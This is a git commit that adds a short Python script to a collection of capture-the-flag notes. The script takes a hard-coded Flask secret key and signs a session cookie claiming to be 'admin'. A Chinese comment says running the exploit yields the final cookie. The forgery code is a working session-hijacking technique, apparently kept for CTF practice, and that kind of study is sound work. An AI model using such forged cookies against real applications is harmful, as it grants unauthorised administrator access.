babff3c215826a3a624d5d5cdce219073c6159da
wgf4242 <wgf4242@gmail.com>
2021-09-22 19:50:36 +0800

    sync

---
+++ docs/ctf/scripts/web_flask_jwt_token.py
@@ -0,0 +1,16 @@
+from flask import Flask
+from flask.sessions import SecureCookieSessionInterface
+
+app = Flask(__name__)
+app.secret_key = b'fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y'
+
+session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)
+
+@app.route('/')
+def index():
+    print(session_serializer.dumps("admin"))
+
+index()
+```
+
+# `python exp.py` 得到最终的cookie
